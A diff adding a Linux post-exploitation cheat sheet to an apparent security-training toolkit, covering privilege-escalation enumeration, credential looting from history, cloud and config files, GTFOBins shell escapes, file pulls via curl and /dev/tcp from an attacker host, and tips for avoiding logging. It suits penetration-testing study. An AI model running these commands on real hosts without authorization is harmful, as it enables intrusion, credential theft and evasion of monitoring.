@@ -10836,6 +10836,513 @@ var TOOLKIT = [
         ]
       },
       {
+        "id": "linux-builtins",
+        "name": "Linux Built-in Commands",
+        "url": "https://gtfobins.github.io/",
+        "description": "The native toolset for post-exploitation on Linux — orient, find privesc, loot creds, move and transfer, living off the land with no uploads.",
+        "brief": "Every Linux host already ships the tools you need to orient yourself after a foothold — no upload, no download, nothing for AV to flag. This page collects the built-in commands worth knowing: who you are and what you can do (id, sudo -l), host and kernel context (uname -a, /etc/os-release), the privilege-escalation surface (SUID/SGID and capability hunts, writable files, cron), credential looting (shell history, config files, /proc), scheduled jobs and services, networking, and file transfer without tooling.\n\nThese are \"living off the land\": coreutils and standard binaries that are present, expected, and rarely alerted on by themselves — the quiet first move before reaching for LinPEAS or anything you'd have to stage. Most of it is read-first enumeration; the few state-changing commands (chmod, chown, crontab -e) are called out. A separate section covers GTFOBins — turning a sudo entry, SUID bit or capability on a legitimate binary into a shell. Values shown as <…> are placeholders.",
+        "quickReference": [
+          {
+            "label": "Who am I, what can I run as root",
+            "cmd": "id\nsudo -l"
+          },
+          {
+            "label": "Host & kernel in one line",
+            "cmd": "uname -a ; cat /etc/os-release"
+          },
+          {
+            "label": "Find SUID binaries (classic privesc map)",
+            "cmd": "find / -perm -4000 -type f 2>/dev/null"
+          },
+          {
+            "label": "Find file capabilities",
+            "cmd": "getcap -r / 2>/dev/null"
+          },
+          {
+            "label": "Hunt secrets in config/home",
+            "cmd": "grep -RniE 'pass(word)?|secret|api[_-]?key|token' /etc /var/www /home 2>/dev/null | head"
+          }
+        ],
+        "sections": [
+          {
+            "title": "System, user & session context",
+            "type": "table",
+            "columns": [
+              "Command",
+              "What it tells you"
+            ],
+            "rows": [
+              [
+                "id",
+                "Your uid/gid and every group you are in (the first thing to read)"
+              ],
+              [
+                "whoami / groups",
+                "Current username / group names"
+              ],
+              [
+                "uname -a",
+                "Kernel version and architecture (match to kernel exploits)"
+              ],
+              [
+                "cat /etc/os-release",
+                "Distro and version"
+              ],
+              [
+                "cat /etc/issue",
+                "Pre-login banner (often the distro/version too)"
+              ],
+              [
+                "hostname / hostnamectl",
+                "Machine name and basic host facts"
+              ],
+              [
+                "w / who",
+                "Who is logged on right now, and from where"
+              ],
+              [
+                "last / lastlog",
+                "Recent logins / last login per account"
+              ],
+              [
+                "env / set",
+                "Environment variables (sometimes hold tokens, proxies, paths)"
+              ],
+              [
+                "cat /proc/version",
+                "Kernel + compiler/distro build string"
+              ],
+              [
+                "uptime",
+                "How long the host has been up (clues to cron/patch cadence)"
+              ]
+            ]
+          },
+          {
+            "title": "Users, groups & sudo",
+            "type": "table",
+            "columns": [
+              "Command",
+              "What it does"
+            ],
+            "rows": [
+              [
+                "sudo -l",
+                "What you may run as root (highest-value single check)"
+              ],
+              [
+                "cat /etc/passwd",
+                "All accounts; grep -vE \"nologin|false\" for ones with a shell"
+              ],
+              [
+                "cat /etc/group",
+                "Group membership (look for sudo, wheel, docker, lxd, disk, adm)"
+              ],
+              [
+                "getent passwd / getent group",
+                "Accounts/groups including any from LDAP/SSSD, not just local files"
+              ],
+              [
+                "cat /etc/sudoers /etc/sudoers.d/*",
+                "Sudo rules in full (NOPASSWD, env_keep, wildcards)"
+              ],
+              [
+                "cat /etc/shadow",
+                "Password hashes — root-readable only (or via a mis-permission/backup)"
+              ],
+              [
+                "ls -la /var/backups/",
+                "Old copies of passwd/shadow/group that are often world-readable"
+              ]
+            ]
+          },
+          {
+            "title": "Privilege-escalation surface (SUID, caps, writable)",
+            "type": "table",
+            "columns": [
+              "Command",
+              "What it finds"
+            ],
+            "rows": [
+              [
+                "find / -perm -4000 -type f 2>/dev/null",
+                "SUID binaries — run as their owner (often root); check each on GTFOBins"
+              ],
+              [
+                "find / -perm -2000 -type f 2>/dev/null",
+                "SGID binaries — run with the group of the file"
+              ],
+              [
+                "getcap -r / 2>/dev/null",
+                "File capabilities (cap_setuid, cap_dac_read_search…) — a quieter SUID"
+              ],
+              [
+                "capsh --print",
+                "Capabilities of the current shell/process"
+              ],
+              [
+                "find / -writable -type d 2>/dev/null",
+                "Directories you can write to (staging, PATH hijack, cron drops)"
+              ],
+              [
+                "find / -perm -o+w -type f 2>/dev/null",
+                "World-writable files (scripts a privileged job may run)"
+              ],
+              [
+                "ls -la /etc/cron* /etc/crontab",
+                "Cron jobs — a writable script run by root is an instant win"
+              ],
+              [
+                "cat /etc/fstab ; mount",
+                "Mount options — nosuid/nodev, and NFS no_root_squash shares"
+              ]
+            ]
+          },
+          {
+            "title": "File permissions & ownership",
+            "type": "table",
+            "columns": [
+              "Command",
+              "What it does"
+            ],
+            "rows": [
+              [
+                "ls -la <path>",
+                "Owner, group and permission bits"
+              ],
+              [
+                "stat <file>",
+                "Full metadata incl. exact mode and timestamps"
+              ],
+              [
+                "getfacl <file>",
+                "POSIX ACLs beyond the basic rwx bits"
+              ],
+              [
+                "lsattr <file>",
+                "Extended attributes (immutable +i blocks even root until removed)"
+              ],
+              [
+                "find . -writable 2>/dev/null",
+                "What you can modify under a path"
+              ],
+              [
+                "chmod / chown <…>",
+                "Change mode/owner — state-changing, use deliberately and within scope"
+              ],
+              [
+                "chattr -i <file>",
+                "Remove the immutable bit (needs CAP_LINUX_IMMUTABLE) — state-changing"
+              ],
+              [
+                "umask",
+                "Default permission mask for files you create"
+              ]
+            ]
+          },
+          {
+            "title": "Hunting credentials & secrets",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Keys, history and cloud creds in home dirs",
+                "cmd": "ls -la ~/.ssh /home/*/.ssh 2>/dev/null\ncat ~/.bash_history ~/.*_history 2>/dev/null\ncat ~/.aws/credentials ~/.config/gcloud/*.json ~/.netrc ~/.git-credentials 2>/dev/null"
+              },
+              {
+                "label": "Grep the config roots for secrets",
+                "cmd": "grep -RniE 'pass(word)?|secret|api[_-]?key|token|BEGIN (RSA|OPENSSH) PRIVATE' /etc /opt /var/www /home 2>/dev/null | head -40"
+              },
+              {
+                "label": "Secrets passed on command lines / in process env",
+                "cmd": "cat /proc/*/cmdline 2>/dev/null | tr '\\0' ' ' | grep -iE 'pass|token|key'\ncat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'PASS|TOKEN|KEY'"
+              },
+              {
+                "label": "Web-app configs almost always hold a DB string",
+                "cmd": "cat /var/www/html/wp-config.php /var/www/*/.env /opt/*/config* 2>/dev/null"
+              }
+            ]
+          },
+          {
+            "title": "Scheduled jobs, services & startup",
+            "type": "table",
+            "columns": [
+              "Command",
+              "What it does"
+            ],
+            "rows": [
+              [
+                "crontab -l",
+                "Your own cron jobs"
+              ],
+              [
+                "ls -la /etc/cron.d /etc/cron.daily /etc/crontab",
+                "System cron — inspect each script’s owner/permissions"
+              ],
+              [
+                "systemctl list-timers --all",
+                "systemd timers (the modern cron) and when they next fire"
+              ],
+              [
+                "systemctl list-units --type=service",
+                "Running services — note any you can influence"
+              ],
+              [
+                "systemctl cat <service>",
+                "A unit’s ExecStart path — a writable target runs as its User="
+              ],
+              [
+                "cat /etc/rc.local ; ls /etc/init.d",
+                "Legacy startup scripts"
+              ],
+              [
+                "service --status-all",
+                "SysV service status overview"
+              ]
+            ]
+          },
+          {
+            "title": "Processes & resources",
+            "type": "table",
+            "columns": [
+              "Command",
+              "What it does"
+            ],
+            "rows": [
+              [
+                "ps auxww",
+                "Every process with full command lines (creds, scripts, root jobs)"
+              ],
+              [
+                "ps -ef --forest",
+                "Process tree — parent/child relationships"
+              ],
+              [
+                "pstree -ap",
+                "Compact tree with pids and args"
+              ],
+              [
+                "cat /proc/<pid>/cmdline",
+                "Exact arguments of one process"
+              ],
+              [
+                "lsof -i / lsof -p <pid>",
+                "Open network sockets / files for a process"
+              ],
+              [
+                "watch -n1 'ps -eo pid,user,cmd --sort=start_time | tail'",
+                "Poor-man’s pspy — catch short-lived root cron jobs with built-ins"
+              ]
+            ]
+          },
+          {
+            "title": "Networking",
+            "type": "table",
+            "columns": [
+              "Command",
+              "What it does"
+            ],
+            "rows": [
+              [
+                "ip a / ip addr",
+                "Interfaces and addresses (netstat/ifconfig on older hosts)"
+              ],
+              [
+                "ip route / route -n",
+                "Routing table — other subnets this host can reach (pivot targets)"
+              ],
+              [
+                "ss -tulpn",
+                "Listening TCP/UDP ports and owning processes (netstat -tulpn older)"
+              ],
+              [
+                "ip neigh / arp -a",
+                "ARP/neighbour cache — hosts already being talked to"
+              ],
+              [
+                "cat /etc/hosts /etc/resolv.conf",
+                "Static host entries and DNS servers"
+              ],
+              [
+                "getent hosts <name>",
+                "Resolve a name through nsswitch (DNS/hosts/LDAP)"
+              ],
+              [
+                "curl / wget",
+                "Fetch over HTTP(S) — pull a file or hit an internal service"
+              ],
+              [
+                "ping / nc -vz <host> <port>",
+                "Reachability / quick port check (nc where present)"
+              ]
+            ]
+          },
+          {
+            "title": "File transfer & shell stabilisation (no extra tools)",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Upgrade a dumb shell to a full PTY",
+                "cmd": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# then background with Ctrl-Z and run on YOUR box:\nstty raw -echo ; fg\n# back in the shell:\nexport TERM=xterm ; export SHELL=/bin/bash"
+              },
+              {
+                "label": "Pull a file with what is present",
+                "cmd": "curl -sO http://<you>/f    # or: wget http://<you>/f\n# bash-only, no curl/wget: read a file over a TCP socket\nexec 3<>/dev/tcp/<you>/80 ; echo -e \"GET /f HTTP/1.0\\r\\n\\r\\n\" >&3 ; cat <&3 > f"
+              },
+              {
+                "label": "Serve files from the host you are on",
+                "cmd": "python3 -m http.server 8000     # then fetch from another box"
+              },
+              {
+                "label": "Move data as text when binaries are blocked",
+                "cmd": "base64 -w0 loot.tar.gz          # copy the text out, then: base64 -d > loot.tar.gz"
+              }
+            ]
+          },
+          {
+            "title": "Kernel, packages & mounts (exploit surface)",
+            "type": "table",
+            "columns": [
+              "Command",
+              "What it does"
+            ],
+            "rows": [
+              [
+                "uname -r",
+                "Exact kernel release — match to a local-root CVE (PwnKit aside, weigh stability)"
+              ],
+              [
+                "dpkg -l / rpm -qa",
+                "Installed packages and versions (Debian / RHEL families)"
+              ],
+              [
+                "lsmod ; cat /proc/modules",
+                "Loaded kernel modules"
+              ],
+              [
+                "cat /etc/fstab",
+                "Filesystems and options — NFS no_root_squash, missing nosuid"
+              ],
+              [
+                "df -h ; lsblk",
+                "Mounted filesystems and block devices (disk group = raw disk read)"
+              ],
+              [
+                "ldd --version ; ls -l /usr/bin/pkexec",
+                "glibc version / is SUID pkexec present (PwnKit CVE-2021-4034)"
+              ]
+            ]
+          },
+          {
+            "title": "GTFOBins — abusing legitimate binaries",
+            "type": "table",
+            "columns": [
+              "Via",
+              "Shell / primitive"
+            ],
+            "rows": [
+              [
+                "sudo (any allowed binary)",
+                "Check gtfobins.github.io for the exact escape, e.g. sudo awk 'BEGIN{system(\"/bin/sh\")}'"
+              ],
+              [
+                "SUID binary",
+                "find . -exec /bin/sh -p \\; -quit   (-p keeps the euid); or the binary’s GTFOBins SUID entry"
+              ],
+              [
+                "Capability cap_setuid",
+                "e.g. python3 with the cap: os.setuid(0) then a shell"
+              ],
+              [
+                "Editors / pagers",
+                "vim -c ':!/bin/sh' ;  in less/man:  !/bin/sh"
+              ],
+              [
+                "Interpreters",
+                "perl -e 'exec \"/bin/sh\";' ;  python3 -c 'import os;os.system(\"/bin/sh\")'"
+              ],
+              [
+                "File read / write",
+                "Many binaries (e.g. cat, tee via sudo) read/write root-owned files — add a uid-0 user or an SSH key"
+              ]
+            ]
+          },
+          {
+            "title": "Typical first-5-minutes workflow",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "Orient and find the fast wins",
+                "cmd": "id ; sudo -l\nuname -a ; cat /etc/os-release\nfind / -perm -4000 -type f 2>/dev/null        # SUID\ngetcap -r / 2>/dev/null                        # capabilities"
+              },
+              {
+                "label": "Jobs, network, secrets",
+                "cmd": "ls -la /etc/cron* ; systemctl list-timers --all\nss -tulpn ; ip route\ngrep -RniE 'pass|secret|key|token' /etc /var/www 2>/dev/null | head"
+              },
+              {
+                "label": "Then run the automated pass (noisier)",
+                "cmd": "# LinPEAS / lse.sh confirm the same surface fast — run after the quiet manual look\n./linpeas.sh -q | tee linpeas.txt"
+              }
+            ]
+          },
+          {
+            "title": "Notes & OPSEC",
+            "type": "notes",
+            "items": [
+              "sudo -l is the highest-value single command: a NOPASSWD entry, an env_keep that lets you inject LD_PRELOAD, or a wildcard almost always maps to a GTFOBins escape to root.",
+              "find for SUID/SGID plus getcap is the core Linux privesc map — take each result to gtfobins.github.io; the lookup, not memorisation, is the skill.",
+              "The pattern to want is \"writable + privileged\": a world-writable script a root cron/timer runs, a writable systemd ExecStart, or a writable directory on a privileged PATH.",
+              "Dangerous group memberships are quick wins: docker and lxd/lxc are effectively root, disk lets you read the raw device (and /etc/shadow), and adm reads logs.",
+              "These built-ins are signed, present, and rarely alerted on individually — but a burst in seconds is itself behavioural signal, so pace enumeration and prefer one broad command over five.",
+              "Prefer the quiet manual look before LinPEAS: the automated scripts touch thousands of files and stand out in auditd/EDR, while id + sudo -l + a couple of finds are nearly invisible.",
+              "The /dev/tcp transfer and reverse-shell tricks are a bash feature — they are absent in dash/sh and in busybox, so confirm the shell first.",
+              "Every command here runs in your shell and lands in ~/.bash_history and, where configured, auditd/execve logging — unset HISTFILE or use a shell with history off only within scope and with authorization.",
+              "ip/ss replace ifconfig/netstat on modern distros; fall back to the old tools on minimal or older hosts where the new ones are missing.",
+              "A redacting 2>/dev/null hides permission-denied noise but can also hide real errors — drop it when a command behaves unexpectedly.",
+              "kernel exploits (uname -r → a CVE) are a last resort: weigh the panic/stability risk; a misconfiguration (SUID, sudo, cron, caps) is almost always safer and quieter.",
+              "Confirm written authorization before enumerating or changing anything on a host you do not own."
+            ]
+          },
+          {
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "GTFOBins — Unix binaries that bypass restrictions",
+                "url": "https://gtfobins.github.io/"
+              },
+              {
+                "label": "Linux man pages (man7.org)",
+                "url": "https://man7.org/linux/man-pages/"
+              },
+              {
+                "label": "Theory — Linux Privilege Escalation",
+                "url": "theory/2026-10-09-linux-privilege-escalation.html"
+              },
+              {
+                "label": "Theory — Linux Credential Access & Looting",
+                "url": "theory/2026-10-15-linux-credential-access-and-looting.html"
+              },
+              {
+                "label": "Theory — Linux Lateral Movement & SSH",
+                "url": "theory/2026-10-15-linux-lateral-movement-and-ssh.html"
+              },
+              {
+                "label": "Theory — Pivoting & Tunnelling",
+                "url": "theory/2026-10-09-pivoting-and-tunnelling.html"
+              },
+              {
+                "label": "Toolkit — Windows Built-in Commands (the Windows counterpart)",
+                "url": "tool-detail.html?tool=windows-builtins"
+              },
+              {
+                "label": "Map — Linux Privilege Escalation",
+                "url": "linux-privesc-map.html#foothold"
+              }
+            ]
+          }
+        ]
+      },
+      {
         id: "mimikatz",
         name: "Mimikatz",
         url: "https://github.com/gentilkiwi/mimikatz",
